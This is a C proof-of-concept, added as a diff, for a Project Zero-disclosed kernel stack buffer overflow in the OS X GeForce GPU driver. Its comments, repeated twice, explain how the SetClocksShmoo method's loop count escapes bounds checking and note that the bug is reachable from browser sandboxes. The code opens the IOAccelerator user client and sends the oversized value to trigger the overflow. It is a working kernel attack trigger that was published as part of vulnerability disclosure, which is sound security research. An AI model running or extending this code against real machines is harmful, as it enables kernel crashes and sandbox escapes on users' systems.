@@ -1,0 +1,155 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=724
+
+nvAPIClient::Escape is the sole external method of nvAcclerator userclient type 0x2a0.
+It implements its own method and parameter demuxing using the struct-in struct-out
+buffers.
+
+The second dword in the struct in buffer is another method identifier used in a switch
+statement in ::Escape to choose the method to call. Method 24 is ::SetClocksShmoo.
+
+On entry to this method rsi points to a buffer in kernel space with completely
+user-controlled contents.
+
+The uint16_t field at +0xc is used a loop count for the memory copying loop at
++0xff3e with insufficient bounds checking. The destination stack buffer is 0x520 bytes below the saved
+frame pointer but the code only checks whether the value we provide (after bit shifting)
+is greater than 0xff. Since each iteration of the loop writes 0x14 bytes we can actually
+write up to 0x13ec bytes which is well over the size of the stack buffer which is being copied
+into.
+
+This bug is reachable from the safari renderer sandbox and the chrome gpu process sandbox
+on device with the appropriate hardware (eg macbookpro)
+*/
+
+// ianbeer
+
+// build: clang -o nv_shmoo nv_shmoo.c -framework IOKit
+// tested on MacBookPro 10,1  w/10.11.3 (15D21)
+
+/*
+OS X kernel stack buffer overflow in GeForce gpu driver
+
+nvAPIClient::Escape is the sole external method of nvAcclerator userclient type 0x2a0.
+It implements its own method and parameter demuxing using the struct-in struct-out
+buffers.
+
+The second dword in the struct in buffer is another method identified used in a switch
+statement in ::Escape to choose the method to call. Method 24 is ::SetClocksShmoo.
+
+On entry to this method rsi points to a buffer in kernel space with completely
+user-controlled contents.
+
+The uint16_t field at +0xc is used a loop count for the memory copying loop at
++0xff3e with insufficient bounds checking. The destination stack buffer is 0x520 bytes below the saved
+frame pointer but the code only checks whether the value we provide (after bit shifting)
+is greater than 0xff. Since each iteration of the loop writes 0x14 bytes we can actually
+write up to 0x13ec bytes which is well over the size of the stack buffer which is being copied
+into.
+
+This bug is reachable from the safari renderer sandbox and the chrome gpu process sandbox
+on device with the appropriate hardware (eg macbookpro)
+*/
+
+#include <stdint.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+
+#include <mach/mach.h>
+#include <mach/vm_map.h>
+
+#include <IOKit/IOKitLib.h>
+
+uint64_t release_device_texture(mach_port_t conn) {
+  kern_return_t err;
+  
+  uint64_t inputScalar[16];  
+  uint64_t inputScalarCnt = 0;
+
+  char inputStruct[4096];
+  size_t inputStructCnt = 0;
+
+  uint64_t outputScalar[16];
+  uint32_t outputScalarCnt = 0;
+
+  char outputStruct[4096];
+  size_t outputStructCnt = 0;
+
+
+  inputStructCnt = 4096;
+  memset(inputStruct, 'A', inputStructCnt);
+
+  *((uint32_t*)(inputStruct+0x0)) = 1;
+  *((uint32_t*)(inputStruct+0x4)) = 24;    // ::setShmoo
+  *((uint16_t*)(inputStruct+0xc)) = 0x1fe;
+
+  outputStructCnt = 4096;
+
+  err = IOConnectCallMethod(
+   conn,
+   0x0,
+   inputScalar,
+   inputScalarCnt,
+   inputStruct,
+   inputStructCnt,
+   outputScalar,
+   &outputScalarCnt,
+   outputStruct,
+   &outputStructCnt); 
+
+  if (err != KERN_SUCCESS){
+   printf("IOConnectCall error: %x\n", err);
+  } else{
+    printf("worked?\n");
+  }
+  
+  return 0;
+}
+
+mach_port_t get_user_client(char* name, int type) {
+  kern_return_t err;
+
+  CFMutableDictionaryRef matching = IOServiceMatching(name);
+  if(!matching){
+   printf("unable to create service matching dictionary\n");
+   return 0;
+  }
+
+  io_iterator_t iterator;
+  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
+  if (err != KERN_SUCCESS){
+   printf("no matches\n");
+   return 0;
+  }
+
+  io_service_t service = IOIteratorNext(iterator);
+
+  if (service == IO_OBJECT_NULL){
+   printf("unable to find service\n");
+   return 0;
+  }
+  printf("got service: %x\n", service);
+
+
+  io_connect_t conn = MACH_PORT_NULL;
+  err = IOServiceOpen(service, mach_task_self(), type, &conn);
+  if (err != KERN_SUCCESS){
+   printf("unable to get user client connection\n");
+   return 0;
+  }
+
+  printf("got userclient connection: %x\n", conn);
+
+  return conn;
+}
+
+
+
+int main(int argc, char** argv){
+  mach_port_t gl_context = get_user_client("IOAccelerator", 0x2a0);
+  release_device_texture(gl_context);
+  return 0;
+
+}
